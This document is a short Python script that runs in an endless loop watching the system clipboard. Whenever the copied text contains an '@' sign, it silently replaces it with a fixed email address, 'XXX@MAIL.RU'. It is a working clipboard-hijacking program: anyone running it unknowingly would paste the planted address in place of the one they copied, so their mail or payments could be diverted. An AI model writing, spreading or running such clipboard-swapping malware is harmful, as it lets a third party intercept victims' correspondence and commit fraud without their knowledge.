import pyperclip
import time
em='XXX@MAIL.RU'
des=''
while True:
    s=pyperclip.paste()
    if "@" in s and (s != des):      
        pyperclip.copy(em)
        print(em)
        des=em
    elif "@" not in s and (s != des):
        print(s)   
        des=s
        time.sleep(2)
        
 

 
           

    